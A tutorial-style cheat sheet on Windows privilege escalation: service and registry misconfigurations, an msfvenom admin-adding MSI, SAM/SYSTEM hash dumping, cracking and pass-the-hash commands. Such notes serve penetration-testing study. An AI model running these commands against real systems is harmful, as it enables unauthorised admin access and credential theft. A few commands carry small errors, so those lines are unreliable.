# Windows Privilege Escalation

> Arav Budhiraja | 5th October 2021

# Setup

1. [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
2. [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
3. [AccessChk](https://download.sysinternals.com/files/AccessChk.zip)
4. [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng)

# Services exploitation

Services are programs that run in the background to perform tasks 

If a service is running with SYSTEM privileges and it is misconfigured, we can exploit it and gain command execution with SYSTEM privileges

If we cannot start/stop a service, then it is a rabbit hole and cannot be exploited

For automated services enumeration, we can run the command below

```bash
winPEAS.exe quite serviceinfo
```

## Writeable Service Executable

In this case, if we are able to write to the directory which stores the executable of a service, then we can replace this executable with a malicious one

We will need permissions to start/stop the service and write to the directory storing the exe

1. If we see 'File Permissions: Everyone [AllAccess]' in the winPEAS output, then we know that we can write to a directory storing the exe of a service

```bash
write-svc(My custom svc)["C:\Temp\service.exe"] - Manual - Stopped
File Permissions: Everyone [AllAccess]
```

Here, 'write-svc' is the name of the service

2. We can check if we can overwrite the service exe by using AccessChk

```txt
accesschk.exe /accepteula -vwqu "C:\Temp\service.exe"
```

3. To check if we are able to start/stop the service, we can run this command

```txt
accesschk.exe /accepteula -vwqec %USERNAME% write-svc
```

Here, 'write-svc' is the name of the misconfigured service

If we cannot start/stop the service, then we will not be able to escalate our privileges

3. Now to check with what privileges the service will run with, we can run the command below

```txt
sc qc write-svc
```

Here, 'write-svc' is the name of the misconfigured service

If the value of 'SERVICE_START_NAME' is 'LocalSystem', then that means the service will run with SYSTEM privileges

4. To check whether the service is stopped/running, run this command

```txt
sc query insecure-svc
```

Here, 'write-svc' is the name of the misconfigured service

5. If the service is RUNNING, then you can stop it using the command below

```txt
net stop write-svc
```

6. Now we can replace the service executable with our malicious one

```txt
copy exploit.exe C:\Temp\service.exe
```

7. All that is left is to start the service which can be done by running this command. This will run the malicious exe with SYSTEM privileges

```txt
net start write-svc
```

## Insecure Service Permissions

In this case, if we are able to start/stop a service which runs with SYSTEM privileges and change it's configuration, then we run can commands with SYSTEM privileges

1. If we see 'YOU CAN MODIFY THIS SERVICE' in the winPEAS output, then we know that the service has insecure permissions and so we can change the configuration such that it will point to a malicious exe

```bash
insecure-svc(Insecure Service)["C:\Program Files\Insecure Service\service.exe"] - Manual - Stopped
YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
```

As we can see, the name of the service 'insecure-svc'

2. To check if we are able to start/stop the service and change the configuration, we can run this command

```txt
accesschk.exe /accepteula -vwqec %USERNAME% insecure-svc
```

Here, 'insecure-svc' is the name of the misconfigured service

If we cannot start/stop the service, then we will not be able to escalate our privileges

3. Now to check with what privileges the service will run with, we can run the command below

```txt
sc qc insecure-svc
```

Here, 'insecure-svc' is the name of the misconfigured service

If the value of 'SERVICE_START_NAME' is 'LocalSystem', then that means the service will run with SYSTEM privileges

4. To check whether the service is stopped/running, run this command

```txt
sc query insecure-svc
```

Here, 'insecure-svc' is the name of the misconfigured service

5. If the service is RUNNING, then you can stop it using the command below

```txt
net stop insecure-svc
```

6. Now we can change the configuration of the service to point to our malicious exe

```txt
sc config insecure-svc binpath= "\"C:\Temp\exploit.exe\""
```

7. All that is left is to start the service which can be done by running this command. This will run the malicious exe with SYSTEM privileges

```txt
net start insecure-svc
```

## Unquoted Service Path

If we consider the followed path, C:\Program Files\service.exe, then we can obviously see that it will run 'service.exe'

However, Windows will treat this at C:\Program.exe and treat 'Files\service.exe' as arguments for the program

To abuse this misconfiguration, we need to be able to start/stop the service and write to the directory which stores the service's exe

1. If we see 'No quotes and Space detected' in the winPEAS output, then we know that there is a service whose path has white spaces and no quotes

```txt
vuln-svc(Vulnerable Service)[C:\Program Files\Vulnerable Service\service.exe] - Manual - Stopped - No quotes and Space detected
```

Here, 'vuln-svc' is the name of the service

Windows will treat it as C:\Program.exe and the rest would be arguments 

2. We can check if we have write access to the directories by using AccessChk

```txt
accesschk.exe /accepteula -dvqw "C:\"
accesschk.exe /accepteula -dvqw "C:\Program Files\"
accesschk.exe /accepteula -dvqw "C:\Program Files\Vulnerable Service\"
```

* If we have write access to 'C:\', then we can create 'Program.exe'
* If we have write access to 'C:\Program Files', then we can create 'Vulnerable.exe'
* If we have write access to 'C:\Program Files\Vulnerable Service', then we can follow the writeable service executable path

Lets say that we have write access to 'C:\Program Files' so now we can copy our malicious exe to the directory and name it 'Vulnerable.exe'

3. To check if we are able to start/stop the service, we can run this command

```txt
accesschk.exe /accepteula -vwqec %USERNAME% vuln-svc
```

Here, 'vuln-svc' is the name of the misconfigured service

If we cannot start/stop the service, then we will not be able to escalate our privileges

4. Now to check with what privileges the service will run with, we can run the command below

```txt
sc qc vuln-svc
```

Here, 'vuln-svc' is the name of the misconfigured service

If the value of 'SERVICE_START_NAME' is 'LocalSystem', then that means the service will run with SYSTEM privileges

5. To check whether the service is stopped/running, run this command

```txt
sc query vuln-svc
```

Here, 'vuln-svc' is the name of the misconfigured service

6. If the service is RUNNING, then you can stop it using the command below

```txt
net stop vuln-svc
```

7. Now we can copy our malicious exe to 'C:\Program Files' and name it 'Vulnerable.exe'

```txt
copy C:\Temp\exploit.exe "C:\Program Files\Vulnerable.exe"
```

8. All that is left is to start the service which can be done by running this command. This will run the malicious exe with SYSTEM privileges

```txt
net start vuln-svc
```

## Weak Registry Permissions

The windows registry stores entries for each service. If the ACL for a service is misconfigured, we can modify it's configuration and run a malicious exe with SYSTEM privileges

1. If we see '(Interactive [TakeOwnership])' in the winPEAS output, then we know that the service has weak registry permissions 

```bash
HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
```

Here, the name of the service is 'regsvc'

Now we can search for 'regsvc' in the output and find the location of it's exe. Let's take it as C:\Program Files\Reg Service\service.exe

2. We should first check if we have write access to that directory

```bash
accesschk.exe /accepteula -dvqw "C:\Program Files\Reg Service"
```

If we have write access to that directory, we can follow the writeable service executable path

3. If we do not have write access to the directory, we should check if we can modify the registry path for the service

```bash
accesschk.exe /accepteula -uvqwk HKLM\system\currentcontrolset\services\regsvc
```

If we see the permission as 'KEY_ALL_ACCESS', that means we have access to the registry keys for the service

4. To check if we are able to start/stop the service, we can run this command

```txt
accesschk.exe /accepteula -vwqec %USERNAME% regsvc
```

Here, 'regsvc' is the name of the misconfigured service

If we cannot start/stop the service, then we will not be able to escalate our privileges

5. Now to check with what privileges the service will run with, we can run the command below

```txt
sc qc regsvc
```

Here, 'regsvc' is the name of the misconfigured service

If the value of 'SERVICE_START_NAME' is 'LocalSystem', then that means the service will run with SYSTEM privileges

6. To check whether the service is stopped/running, run this command

```txt
sc query regsvc
```

Here, 'regsvc' is the name of the misconfigured service

7. Now we can modify the registry and set the path for the exe as our malicious one

```bash
reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\exploit.exe /f
```

8. All that is left is to start the service which can be done by running this command. This will run the malicious exe with SYSTEM privileges

```txt
net start regsvc
```

# Registry Exploits

The registry is a database which stores low-level settings of windows/apps

## AutoRun



## AlwaysInstallElevated

If there are registry settings which allow MSI files to be installed with admin privileges, then we can generate a malicious MSI file and execute it, giving us local admin privileges

1. To check if this feature is enabled, we will not require winPEAS. This can be detected by querying the registry for 2 keys using these commands

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both the keys are set to *0*x*1* then we can escalate our privileges using this bug

2. We can generate a malicious MSI with MSFVenom which will add a local admin

```txt
msfvenom -p windows/adduser USER=hacker PASS=mypass123 -f msi -o myapp.msi
```

3. Now we can download this and execute it 

```bash
msiexec /quiet /qn /i myapp.msi
```

4. If we check the users on the system, we can see that a user named 'hacker' has been added
5. To switch to this new user, run the command given below and enter the password as 'mypass123'

```bash
runas /user:hacker cmd
```

## Cleartext passwords

Windows stores passwords in cleartext in the registry 

We can find these by using winPEAS

```bash
winPEAS.exe quiet filesinfo userinfo
```

# Saved credentials

Windows allows user to save credentials into the registry 

To find these, we can run this command

```bash
cmdkey /list
```

Or we can again use winPEAS

```bash
winPEAS.exe quiet cmd windowscreds
```

If we find saved credentials for a user who is a local admin, we switch to that user by running this command

```bash
runas /savecred /user:admin cmd
```

Here, 'admin' is the username of the local admin

# Insecure GUI Apps

In some versions of windows, users can be granted the permission to run GUI apps with admin privileges. If this is the case and the app allows us to open files, then we can launch cmd and run commands with admin privileges

1. First we should find a GUI app which may run with admin privileges. In this case we will use MS Paint
2. Upon launching it, run this command to find the user which is running the process

```bash
tasklist /V | findstr mspaint.exe
```

If we see the username as something different then our's, then we can run commands as that user

3. In the top right, click on 'File' and then on 'Open'. This will open the file explorer
4. In the top bar where we type the location of files, type 'cmd'
5. This will open cmd and let us execute commands with admin privileges

# Startup apps

If we have access to the directory which stores the shortcuts for startup apps, then we create a shortcut which points to a malicious exe and then wait for the user to login 

1. First we have to check if we have write access to the directory which has shortcuts for startup apps. This can be done by running this command

```bash
accesschk.exe /accepteula -qduvw "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

2. If we do have write access, then create a vbs script named 'startup.vbs' and paste this code into it

```vba
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\myapp.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\exploit.exe"
oLink.Save
```

Change the value of 'oLink.TargetPath' to the location of the malicious exe

3. Now run this script

```bash
cscript startup.vbs
```

4. Once an admin user logins in, we will get a shell with admin privileges

# Finding kernel exploits

To do so we will use Windows Exploit Suggester NG

1. Gather the system information about the machine by running this command

```txt
systeminfo
```

2. Copy and paste the output of this into a file on our attack machine 
3. We have to first update the database for the tool which can be done by running this command

```bash
python3 wes.py --update
```

4. Once updated, we can run it and provide the system information file

```bash
python3 wes.py sysinfo.txt
```

# SeBackupPrivilege Exploitation

SeBackupPrivilege allows users to create backups of any file of the system. Since it is possible to read any file, we can read the SAM and SYSTEM files and gain admin access to the system

1. We first have to check if we have the SeBackupPrivilege and if it is enabled. This can be done by running this command

```bash
whoami /priv
```

2. Now that we can confirm that we have the required privilege, we can create a backup of the SAM and SYSTEM files and store it in a temporary directory. This can be done by running these comamnds

```bash
cd C:\
mkdir Temp
reg save hklm\sam C:\Temp\sam.hive
reg save hklm\system C:\Temp\system.hive
```

3. Now we can do these files to the attacker's system
4. To extract the hashes from the files, we will use pypykatz. This can be installed using this command

```bash
sudo pip3 install pypykatz
```

5. Now that we have installed it, we can provide the SAM and SYSTEM files and extract the hashes

```bash
pypykatz --sam sam.hive system.hive
```

6. Since we have the hashes, we can crack them by using John the Ripper or Hashcat

```bash
john --format=NT --wordlist=/opt/rockyou.txt hashes.txt
hashcat -a 0 -m 100 hash.txt /opt/rockyou.txt 
```

7. Instead of cracking the hashes, we can perform a pass the hash attack which will let us authenticate to a service using the hash

```txt
Username:UID:LM Hash:NT Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d
```

8. We would have to pass the NT hash which would be 'a9fdfa038c4b75ebc76dc855dd74f0d' for the admin

```txt
evil-winrm -i 10.10.10.6 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d (If PS Remoting is enabled)
xfreerdp /u:Administrator /pth:a9fdfa038c4b75ebc76dc855dd74f0d /v:10.10.10.6(If RDP is enabled)
crackmapexec smb 10.10.10.6 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d -x whoami (If SMB is enabled)
```
